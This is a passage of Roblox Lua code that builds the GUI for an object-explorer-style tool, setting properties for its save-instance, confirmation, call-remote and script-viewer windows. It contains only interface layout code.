		NewGuiPart39.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart40.Name = "MainWindow"
		NewGuiPart40.Parent = NewGuiPart38
		NewGuiPart40.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart40.BackgroundTransparency = 0.10000000149012
		NewGuiPart40.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart40.Size = UDim2.new(1, 0, 0, 200)

		NewGuiPart41.Name = "Save"
		NewGuiPart41.Parent = NewGuiPart40
		NewGuiPart41.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart41.BackgroundTransparency = 0.5
		NewGuiPart41.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart41.Position = UDim2.new(0.075000003, 0, 1, -40)
		NewGuiPart41.Size = UDim2.new(0.400000006, 0, 0, 30)
		NewGuiPart41.Font = Enum.Font.SourceSans
		NewGuiPart41.FontSize = Enum.FontSize.Size18
		NewGuiPart41.Text = "Save"

		NewGuiPart42.Name = "Desc"
		NewGuiPart42.Parent = NewGuiPart40
		NewGuiPart42.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart42.BackgroundTransparency = 1
		NewGuiPart42.Position = UDim2.new(0, 0, 0, 20)
		NewGuiPart42.Size = UDim2.new(1, 0, 0, 40)
		NewGuiPart42.Font = Enum.Font.SourceSans
		NewGuiPart42.FontSize = Enum.FontSize.Size14
		NewGuiPart42.Text = "This will save an instance to your PC. Type in the name for your instance. (.rbxmx will be added automatically.)"
		NewGuiPart42.TextWrapped = true

		NewGuiPart43.Name = "Cancel"
		NewGuiPart43.Parent = NewGuiPart40
		NewGuiPart43.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart43.BackgroundTransparency = 0.5
		NewGuiPart43.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart43.Position = UDim2.new(0.524999976, 0, 1, -40)
		NewGuiPart43.Size = UDim2.new(0.400000006, 0, 0, 30)
		NewGuiPart43.Font = Enum.Font.SourceSans
		NewGuiPart43.FontSize = Enum.FontSize.Size18
		NewGuiPart43.Text = "Cancel"

		NewGuiPart44.Name = "FileName"
		NewGuiPart44.Parent = NewGuiPart40
		NewGuiPart44.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart44.BackgroundTransparency = 0.20000000298023
		NewGuiPart44.Position = UDim2.new(0.075000003, 0, 0.400000006, 0)
		NewGuiPart44.Size = UDim2.new(0.850000024, 0, 0, 30)
		NewGuiPart44.Font = Enum.Font.SourceSans
		NewGuiPart44.FontSize = Enum.FontSize.Size18
		NewGuiPart44.Text = ""
		NewGuiPart44.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart45.Name = "SaveObjects"
		NewGuiPart45.Parent = NewGuiPart40
		NewGuiPart45.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart45.BackgroundTransparency = 0.60000002384186
		NewGuiPart45.Position = UDim2.new(0.075000003, 0, 0.625, 0)
		NewGuiPart45.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart45.ZIndex = 2
		NewGuiPart45.Font = Enum.Font.SourceSans
		NewGuiPart45.FontSize = Enum.FontSize.Size18
		NewGuiPart45.Text = ""
		NewGuiPart45.TextColor3 = Color3.new(1, 1, 1)

		NewGuiPart46.Name = "enabled"
		NewGuiPart46.Parent = NewGuiPart45
		NewGuiPart46.BackgroundColor3 = Color3.new(0.380392, 0.380392, 0.380392)
		NewGuiPart46.BackgroundTransparency = 0.40000000596046
		NewGuiPart46.BorderSizePixel = 0
		NewGuiPart46.Position = UDim2.new(0, 3, 0, 3)
		NewGuiPart46.Size = UDim2.new(0, 14, 0, 14)
		NewGuiPart46.Font = Enum.Font.SourceSans
		NewGuiPart46.FontSize = Enum.FontSize.Size14
		NewGuiPart46.Text = ""

		NewGuiPart47.Name = "Desc2"
		NewGuiPart47.Parent = NewGuiPart40
		NewGuiPart47.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart47.BackgroundTransparency = 1
		NewGuiPart47.Position = UDim2.new(0.075000003, 30, 0.625, 0)
		NewGuiPart47.Size = UDim2.new(0.925000012, -30, 0, 20)
		NewGuiPart47.Font = Enum.Font.SourceSans
		NewGuiPart47.FontSize = Enum.FontSize.Size14
		NewGuiPart47.Text = "Save \"Object\" type values"
		NewGuiPart47.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart48.Name = "Confirmation"
		NewGuiPart48.Parent = NewGuiPart1
		NewGuiPart48.Active = true
		NewGuiPart48.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart48.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart48.Draggable = true
		NewGuiPart48.Position = UDim2.new(0.300000012, 0, 0.349999994, 0)
		NewGuiPart48.Size = UDim2.new(0, 350, 0, 20)
		NewGuiPart48.Visible = false
		NewGuiPart48.ZIndex = 3

		NewGuiPart49.Name = "Title"
		NewGuiPart49.Parent = NewGuiPart48
		NewGuiPart49.BackgroundTransparency = 1
		NewGuiPart49.Size = UDim2.new(1, 0, 1, 0)
		NewGuiPart49.ZIndex = 3
		NewGuiPart49.Font = Enum.Font.SourceSans
		NewGuiPart49.FontSize = Enum.FontSize.Size14
		NewGuiPart49.Text = "Confirm"
		NewGuiPart49.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart49.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart50.Name = "MainWindow"
		NewGuiPart50.Parent = NewGuiPart48
		NewGuiPart50.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart50.BackgroundTransparency = 0.10000000149012
		NewGuiPart50.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart50.Size = UDim2.new(1, 0, 0, 150)
		NewGuiPart50.ZIndex = 2

		NewGuiPart51.Name = "Yes"
		NewGuiPart51.Parent = NewGuiPart50
		NewGuiPart51.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart51.BackgroundTransparency = 0.5
		NewGuiPart51.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart51.Position = UDim2.new(0.075000003, 0, 1, -40)
		NewGuiPart51.Size = UDim2.new(0.400000006, 0, 0, 30)
		NewGuiPart51.ZIndex = 2
		NewGuiPart51.Font = Enum.Font.SourceSans
		NewGuiPart51.FontSize = Enum.FontSize.Size18
		NewGuiPart51.Text = "Yes"

		NewGuiPart52.Name = "Desc"
		NewGuiPart52.Parent = NewGuiPart50
		NewGuiPart52.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart52.BackgroundTransparency = 1
		NewGuiPart52.Position = UDim2.new(0, 0, 0, 20)
		NewGuiPart52.Size = UDim2.new(1, 0, 0, 40)
		NewGuiPart52.ZIndex = 2
		NewGuiPart52.Font = Enum.Font.SourceSans
		NewGuiPart52.FontSize = Enum.FontSize.Size14
		NewGuiPart52.Text = "The file, FILENAME, already exists. Overwrite?"
		NewGuiPart52.TextWrapped = true

		NewGuiPart53.Name = "No"
		NewGuiPart53.Parent = NewGuiPart50
		NewGuiPart53.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart53.BackgroundTransparency = 0.5
		NewGuiPart53.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart53.Position = UDim2.new(0.524999976, 0, 1, -40)
		NewGuiPart53.Size = UDim2.new(0.400000006, 0, 0, 30)
		NewGuiPart53.ZIndex = 2
		NewGuiPart53.Font = Enum.Font.SourceSans
		NewGuiPart53.FontSize = Enum.FontSize.Size18
		NewGuiPart53.Text = "No"

		NewGuiPart54.Name = "Caution"
		NewGuiPart54.Parent = NewGuiPart1
		NewGuiPart54.Active = true
		NewGuiPart54.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart54.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart54.Draggable = true
		NewGuiPart54.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
		NewGuiPart54.Size = UDim2.new(0, 350, 0, 20)
		NewGuiPart54.Visible = false
		NewGuiPart54.ZIndex = 5

		NewGuiPart55.Name = "Title"
		NewGuiPart55.Parent = NewGuiPart54
		NewGuiPart55.BackgroundTransparency = 1
		NewGuiPart55.Size = UDim2.new(1, 0, 1, 0)
		NewGuiPart55.ZIndex = 5
		NewGuiPart55.Font = Enum.Font.SourceSans
		NewGuiPart55.FontSize = Enum.FontSize.Size14
		NewGuiPart55.Text = "Caution"
		NewGuiPart55.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart55.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart56.Name = "MainWindow"
		NewGuiPart56.Parent = NewGuiPart54
		NewGuiPart56.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart56.BackgroundTransparency = 0.10000000149012
		NewGuiPart56.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart56.Size = UDim2.new(1, 0, 0, 150)
		NewGuiPart56.ZIndex = 4

		NewGuiPart57.Name = "Desc"
		NewGuiPart57.Parent = NewGuiPart56
		NewGuiPart57.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart57.BackgroundTransparency = 1
		NewGuiPart57.Position = UDim2.new(0, 0, 0, 20)
		NewGuiPart57.Size = UDim2.new(1, 0, 0, 42)
		NewGuiPart57.ZIndex = 4
		NewGuiPart57.Font = Enum.Font.SourceSans
		NewGuiPart57.FontSize = Enum.FontSize.Size14
		NewGuiPart57.Text = "The file, FILENAME, already exists. Overwrite?"
		NewGuiPart57.TextWrapped = true

		NewGuiPart58.Name = "Ok"
		NewGuiPart58.Parent = NewGuiPart56
		NewGuiPart58.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart58.BackgroundTransparency = 0.5
		NewGuiPart58.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart58.Position = UDim2.new(0.300000012, 0, 1, -40)
		NewGuiPart58.Size = UDim2.new(0.400000006, 0, 0, 30)
		NewGuiPart58.ZIndex = 4
		NewGuiPart58.Font = Enum.Font.SourceSans
		NewGuiPart58.FontSize = Enum.FontSize.Size18
		NewGuiPart58.Text = "Ok"

		NewGuiPart59.Name = "CallRemote"
		NewGuiPart59.Parent = NewGuiPart1
		NewGuiPart59.Active = true
		NewGuiPart59.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart59.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart59.Draggable = true
		NewGuiPart59.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
		NewGuiPart59.Size = UDim2.new(0, 350, 0, 20)
		NewGuiPart59.Visible = false
		NewGuiPart59.ZIndex = 2

		NewGuiPart60.Name = "Title"
		NewGuiPart60.Parent = NewGuiPart59
		NewGuiPart60.BackgroundTransparency = 1
		NewGuiPart60.Size = UDim2.new(1, 0, 1, 0)
		NewGuiPart60.ZIndex = 2
		NewGuiPart60.Font = Enum.Font.SourceSans
		NewGuiPart60.FontSize = Enum.FontSize.Size14
		NewGuiPart60.Text = "Call Remote"
		NewGuiPart60.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart60.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart61.Name = "MainWindow"
		NewGuiPart61.Parent = NewGuiPart59
		NewGuiPart61.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart61.BackgroundTransparency = 0.10000000149012
		NewGuiPart61.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart61.Size = UDim2.new(1, 0, 0, 200)

		NewGuiPart62.Name = "Desc"
		NewGuiPart62.Parent = NewGuiPart61
		NewGuiPart62.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart62.BackgroundTransparency = 1
		NewGuiPart62.Position = UDim2.new(0, 0, 0, 20)
		NewGuiPart62.Size = UDim2.new(1, 0, 0, 20)
		NewGuiPart62.Font = Enum.Font.SourceSans
		NewGuiPart62.FontSize = Enum.FontSize.Size14
		NewGuiPart62.Text = "Arguments"
		NewGuiPart62.TextWrapped = true

		NewGuiPart63.Name = "Arguments"
		NewGuiPart63.Parent = NewGuiPart61
		NewGuiPart63.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart63.BackgroundTransparency = 1
		NewGuiPart63.Position = UDim2.new(0, 0, 0, 40)
		NewGuiPart63.Size = UDim2.new(1, 0, 0, 80)
		NewGuiPart63.BottomImage = "rbxasset://textures/blackBkg_square.png"
		NewGuiPart63.CanvasSize = UDim2.new(0, 0, 0, 0)
		NewGuiPart63.MidImage = "rbxasset://textures/blackBkg_square.png"
		NewGuiPart63.TopImage = "rbxasset://textures/blackBkg_square.png"

		NewGuiPart64.Name = "DisplayReturned"
		NewGuiPart64.Parent = NewGuiPart61
		NewGuiPart64.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart64.BackgroundTransparency = 0.60000002384186
		NewGuiPart64.Position = UDim2.new(0.075000003, 0, 0.625, 0)
		NewGuiPart64.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart64.ZIndex = 2
		NewGuiPart64.Font = Enum.Font.SourceSans
		NewGuiPart64.FontSize = Enum.FontSize.Size18
		NewGuiPart64.Text = ""
		NewGuiPart64.TextColor3 = Color3.new(1, 1, 1)

		NewGuiPart65.Name = "enabled"
		NewGuiPart65.Parent = NewGuiPart64
		NewGuiPart65.BackgroundColor3 = Color3.new(0.380392, 0.380392, 0.380392)
		NewGuiPart65.BackgroundTransparency = 0.40000000596046
		NewGuiPart65.BorderSizePixel = 0
		NewGuiPart65.Position = UDim2.new(0, 3, 0, 3)
		NewGuiPart65.Size = UDim2.new(0, 14, 0, 14)
		NewGuiPart65.Visible = false
		NewGuiPart65.Font = Enum.Font.SourceSans
		NewGuiPart65.FontSize = Enum.FontSize.Size14
		NewGuiPart65.Text = ""

		NewGuiPart66.Name = "Desc2"
		NewGuiPart66.Parent = NewGuiPart61
		NewGuiPart66.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart66.BackgroundTransparency = 1
		NewGuiPart66.Position = UDim2.new(0.075000003, 30, 0.625, 0)
		NewGuiPart66.Size = UDim2.new(0.925000012, -30, 0, 20)
		NewGuiPart66.Font = Enum.Font.SourceSans
		NewGuiPart66.FontSize = Enum.FontSize.Size14
		NewGuiPart66.Text = "Display values returned"
		NewGuiPart66.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart67.Name = "Add"
		NewGuiPart67.Parent = NewGuiPart61
		NewGuiPart67.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart67.BackgroundTransparency = 0.5
		NewGuiPart67.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart67.Position = UDim2.new(0.800000012, 0, 0.625, 0)
		NewGuiPart67.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart67.Font = Enum.Font.SourceSansBold
		NewGuiPart67.FontSize = Enum.FontSize.Size24
		NewGuiPart67.Text = "+"

		NewGuiPart68.Name = "Subtract"
		NewGuiPart68.Parent = NewGuiPart61
		NewGuiPart68.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart68.BackgroundTransparency = 0.5
		NewGuiPart68.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart68.Position = UDim2.new(0.899999976, 0, 0.625, 0)
		NewGuiPart68.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart68.Font = Enum.Font.SourceSansBold
		NewGuiPart68.FontSize = Enum.FontSize.Size24
		NewGuiPart68.Text = "-"

		NewGuiPart69.Name = "ArgumentTemplate"
		NewGuiPart69.Parent = NewGuiPart61
		NewGuiPart69.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart69.BackgroundTransparency = 0.5
		NewGuiPart69.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart69.Size = UDim2.new(1, 0, 0, 20)
		NewGuiPart69.Visible = false

		NewGuiPart70.Name = "Type"
		NewGuiPart70.Parent = NewGuiPart69
		NewGuiPart70.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart70.BackgroundTransparency = 0.89999997615814
		NewGuiPart70.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart70.Size = UDim2.new(0.400000006, 0, 0, 20)
		NewGuiPart70.Font = Enum.Font.SourceSans
		NewGuiPart70.FontSize = Enum.FontSize.Size18
		NewGuiPart70.Text = "Script"

		NewGuiPart71.Name = "Value"
		NewGuiPart71.Parent = NewGuiPart69
		NewGuiPart71.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart71.BackgroundTransparency = 0.89999997615814
		NewGuiPart71.Position = UDim2.new(0.400000006, 0, 0, 0)
		NewGuiPart71.Size = UDim2.new(0.600000024, -12, 0, 20)
		NewGuiPart71.Font = Enum.Font.SourceSans
		NewGuiPart71.FontSize = Enum.FontSize.Size14
		NewGuiPart71.Text = ""
		NewGuiPart71.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart72.Name = "Cancel"
		NewGuiPart72.Parent = NewGuiPart61
		NewGuiPart72.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart72.BackgroundTransparency = 0.5
		NewGuiPart72.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart72.Size = UDim2.new(0.400000006, 0, 0, 30)
		NewGuiPart72.Font = Enum.Font.SourceSans
		NewGuiPart72.FontSize = Enum.FontSize.Size18
		NewGuiPart72.Text = "Cancel"

		NewGuiPart73.Name = "Ok"
		NewGuiPart73.Parent = NewGuiPart61
		NewGuiPart73.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart73.BackgroundTransparency = 0.5
		NewGuiPart73.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart73.Position = UDim2.new(0.075000003, 0, 1, -40)
		NewGuiPart73.Size = UDim2.new(0.400000006, 0, 0, 30)
		NewGuiPart73.Font = Enum.Font.SourceSans
		NewGuiPart73.FontSize = Enum.FontSize.Size18
		NewGuiPart73.Text = "Call"

		NewGuiPart74.Name = "TableCaution"
		NewGuiPart74.Parent = NewGuiPart1
		NewGuiPart74.Active = true
		NewGuiPart74.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart74.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart74.Draggable = true
		NewGuiPart74.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
		NewGuiPart74.Size = UDim2.new(0, 350, 0, 20)
		NewGuiPart74.Visible = false
		NewGuiPart74.ZIndex = 2

		NewGuiPart75.Name = "MainWindow"
		NewGuiPart75.Parent = NewGuiPart74
		NewGuiPart75.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart75.BackgroundTransparency = 0.10000000149012
		NewGuiPart75.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart75.Size = UDim2.new(1, 0, 0, 150)

		NewGuiPart76.Name = "Ok"
		NewGuiPart76.Parent = NewGuiPart75
		NewGuiPart76.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart76.BackgroundTransparency = 0.5
		NewGuiPart76.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart76.Position = UDim2.new(0.300000012, 0, 1, -40)
		NewGuiPart76.Size = UDim2.new(0.400000006, 0, 0, 30)
		NewGuiPart76.Font = Enum.Font.SourceSans
		NewGuiPart76.FontSize = Enum.FontSize.Size18
		NewGuiPart76.Text = "Ok"

		NewGuiPart77.Name = "TableResults"
		NewGuiPart77.Parent = NewGuiPart75
		NewGuiPart77.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart77.BackgroundTransparency = 1
		NewGuiPart77.Position = UDim2.new(0, 0, 0, 20)
		NewGuiPart77.Size = UDim2.new(1, 0, 0, 80)
		NewGuiPart77.BottomImage = "rbxasset://textures/blackBkg_square.png"
		NewGuiPart77.CanvasSize = UDim2.new(0, 0, 0, 0)
		NewGuiPart77.MidImage = "rbxasset://textures/blackBkg_square.png"
		NewGuiPart77.TopImage = "rbxasset://textures/blackBkg_square.png"

		NewGuiPart78.Name = "TableTemplate"
		NewGuiPart78.Parent = NewGuiPart75
		NewGuiPart78.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart78.BackgroundTransparency = 0.5
		NewGuiPart78.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart78.Size = UDim2.new(1, 0, 0, 20)
		NewGuiPart78.Visible = false

		NewGuiPart79.Name = "Type"
		NewGuiPart79.Parent = NewGuiPart78
		NewGuiPart79.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart79.BackgroundTransparency = 0.89999997615814
		NewGuiPart79.Size = UDim2.new(0.400000006, 0, 0, 20)
		NewGuiPart79.Font = Enum.Font.SourceSans
		NewGuiPart79.FontSize = Enum.FontSize.Size18
		NewGuiPart79.Text = "Script"

		NewGuiPart80.Name = "Value"
		NewGuiPart80.Parent = NewGuiPart78
		NewGuiPart80.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart80.BackgroundTransparency = 0.89999997615814
		NewGuiPart80.Position = UDim2.new(0.400000006, 0, 0, 0)
		NewGuiPart80.Size = UDim2.new(0.600000024, -12, 0, 20)
		NewGuiPart80.Font = Enum.Font.SourceSans
		NewGuiPart80.FontSize = Enum.FontSize.Size14
		NewGuiPart80.Text = "Script"

		NewGuiPart81.Name = "Title"
		NewGuiPart81.Parent = NewGuiPart74
		NewGuiPart81.BackgroundTransparency = 1
		NewGuiPart81.Size = UDim2.new(1, 0, 1, 0)
		NewGuiPart81.ZIndex = 2
		NewGuiPart81.Font = Enum.Font.SourceSans
		NewGuiPart81.FontSize = Enum.FontSize.Size14
		NewGuiPart81.Text = "Caution"
		NewGuiPart81.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart81.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart82.Name = "ScriptEditor"
		NewGuiPart82.Parent = NewGuiPart1
		NewGuiPart82.Active = true
		NewGuiPart82.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart82.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart82.Draggable = true
		NewGuiPart82.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
		NewGuiPart82.Size = UDim2.new(0, 516, 0, 20)
		NewGuiPart82.Visible = false
		NewGuiPart82.ZIndex = 5

		NewGuiPart163.Name = "OpenScript"
		NewGuiPart163.Parent = NewGuiPart82
		NewGuiPart163.Archivable = true

		NewGuiPart83.Name = "Title"
		NewGuiPart83.Parent = NewGuiPart82
		NewGuiPart83.BackgroundTransparency = 1
		NewGuiPart83.Size = UDim2.new(1, 0, 1, 0)
		NewGuiPart83.ZIndex = 5
		NewGuiPart83.Font = Enum.Font.SourceSans
		NewGuiPart83.FontSize = Enum.FontSize.Size14
		NewGuiPart83.Text = "Script Viewer"
		NewGuiPart83.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart83.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart84.Name = "Cover"
		NewGuiPart84.Parent = NewGuiPart82
		NewGuiPart84.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart84.BorderSizePixel = 0
		NewGuiPart84.Position = UDim2.new(0, 0, 3, 0)
		NewGuiPart84.Size = UDim2.new(0, 516, 0, 416)

		NewGuiPart85.Name = "EditorGrid"
		NewGuiPart85.Parent = NewGuiPart82
		NewGuiPart85.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart85.BorderSizePixel = 0
		NewGuiPart85.Position = UDim2.new(0, 0, 3, 0)
		NewGuiPart85.Size = UDim2.new(0, 500, 0, 400)

		NewGuiPart86.Name = "TopBar"
		NewGuiPart86.Parent = NewGuiPart82
		NewGuiPart86.BackgroundColor3 = Color3.new(0.941177, 0.941177, 0.941177)
		NewGuiPart86.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart86.Size = UDim2.new(1, 0, 3, 0)

		NewGuiPart87.Name = "ScriptBarLeft"
		NewGuiPart87.Parent = NewGuiPart86
		NewGuiPart87.Active = false
		NewGuiPart87.BackgroundColor3 = Color3.new(0.866667, 0.866667, 0.866667)
		NewGuiPart87.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart87.Position = UDim2.new(1, -32, 0, 40)
		NewGuiPart87.Size = UDim2.new(0, 16, 0, 20)
		NewGuiPart87.AutoButtonColor = false

		NewGuiPart88.Name = "Arrow Graphic"
		NewGuiPart88.Parent = NewGuiPart87
		NewGuiPart88.BackgroundTransparency = 1
		NewGuiPart88.BorderSizePixel = 0
		NewGuiPart88.Position = UDim2.new(0.5, -4, 0.5, -4)
		NewGuiPart88.Size = UDim2.new(0, 8, 0, 8)

		NewGuiPart89.Name = "Graphic"
		NewGuiPart89.Parent = NewGuiPart88
		NewGuiPart89.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart89.BackgroundTransparency = 0.69999998807907
		NewGuiPart89.BorderSizePixel = 0
		NewGuiPart89.Position = UDim2.new(0.25, 0, 0.375, 0)
		NewGuiPart89.Size = UDim2.new(0.125, 0, 0.25, 0)

		NewGuiPart90.Name = "Graphic"
		NewGuiPart90.Parent = NewGuiPart88
		NewGuiPart90.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart90.BackgroundTransparency = 0.69999998807907
		NewGuiPart90.BorderSizePixel = 0
		NewGuiPart90.Position = UDim2.new(0.375, 0, 0.25, 0)
		NewGuiPart90.Size = UDim2.new(0.125, 0, 0.5, 0)

		NewGuiPart91.Name = "Graphic"
		NewGuiPart91.Parent = NewGuiPart88
		NewGuiPart91.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart91.BackgroundTransparency = 0.69999998807907
		NewGuiPart91.BorderSizePixel = 0
		NewGuiPart91.Position = UDim2.new(0.5, 0, 0.125, 0)
		NewGuiPart91.Size = UDim2.new(0.125, 0, 0.75, 0)

		NewGuiPart92.Name = "Graphic"
		NewGuiPart92.Parent = NewGuiPart88
		NewGuiPart92.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart92.BackgroundTransparency = 0.69999998807907
		NewGuiPart92.BorderSizePixel = 0
		NewGuiPart92.Position = UDim2.new(0.625, 0, 0, 0)
		NewGuiPart92.Size = UDim2.new(0.125, 0, 1, 0)

		NewGuiPart93.Name = "ScriptBarRight"
		NewGuiPart93.Parent = NewGuiPart86
		NewGuiPart93.Active = false
		NewGuiPart93.BackgroundColor3 = Color3.new(0.866667, 0.866667, 0.866667)
		NewGuiPart93.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart93.Position = UDim2.new(1, -16, 0, 40)
		NewGuiPart93.Size = UDim2.new(0, 16, 0, 20)
		NewGuiPart93.AutoButtonColor = false

		NewGuiPart94.Name = "Arrow Graphic"
		NewGuiPart94.Parent = NewGuiPart93
		NewGuiPart94.BackgroundTransparency = 1
		NewGuiPart94.BorderSizePixel = 0
		NewGuiPart94.Position = UDim2.new(0.5, -4, 0.5, -4)
		NewGuiPart94.Size = UDim2.new(0, 8, 0, 8)

		NewGuiPart95.Name = "Graphic"
		NewGuiPart95.Parent = NewGuiPart94
		NewGuiPart95.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart95.BackgroundTransparency = 0.69999998807907
		NewGuiPart95.BorderSizePixel = 0
		NewGuiPart95.Position = UDim2.new(0.625, 0, 0.375, 0)
		NewGuiPart95.Size = UDim2.new(0.125, 0, 0.25, 0)

		NewGuiPart96.Name = "Graphic"
		NewGuiPart96.Parent = NewGuiPart94
		NewGuiPart96.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart96.BackgroundTransparency = 0.69999998807907
		NewGuiPart96.BorderSizePixel = 0
		NewGuiPart96.Position = UDim2.new(0.5, 0, 0.25, 0)
		NewGuiPart96.Size = UDim2.new(0.125, 0, 0.5, 0)

		NewGuiPart97.Name = "Graphic"
		NewGuiPart97.Parent = NewGuiPart94
		NewGuiPart97.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart97.BackgroundTransparency = 0.69999998807907
		NewGuiPart97.BorderSizePixel = 0
		NewGuiPart97.Position = UDim2.new(0.375, 0, 0.125, 0)
		NewGuiPart97.Size = UDim2.new(0.125, 0, 0.75, 0)

		NewGuiPart98.Name = "Graphic"
		NewGuiPart98.Parent = NewGuiPart94
		NewGuiPart98.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart98.BackgroundTransparency = 0.69999998807907
		NewGuiPart98.BorderSizePixel = 0
		NewGuiPart98.Position = UDim2.new(0.25, 0, 0, 0)
		NewGuiPart98.Size = UDim2.new(0.125, 0, 1, 0)

		NewGuiPart99.Name = "Clipboard"
		NewGuiPart99.Parent = NewGuiPart86
		NewGuiPart99.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart99.BackgroundTransparency = 0.5
		NewGuiPart99.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart99.Position = UDim2.new(0, 0, 0, 20)
		NewGuiPart99.Size = UDim2.new(0, 80, 0, 20)
		NewGuiPart99.Font = Enum.Font.SourceSans
		NewGuiPart99.FontSize = Enum.FontSize.Size14
		NewGuiPart99.Text = "To Clipboard"

		NewGuiPart100.Name = "ScriptBar"
		NewGuiPart100.Parent = NewGuiPart86
		NewGuiPart100.BackgroundColor3 = Color3.new(0.823529, 0.823529, 0.823529)
		NewGuiPart100.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart100.ClipsDescendants = true
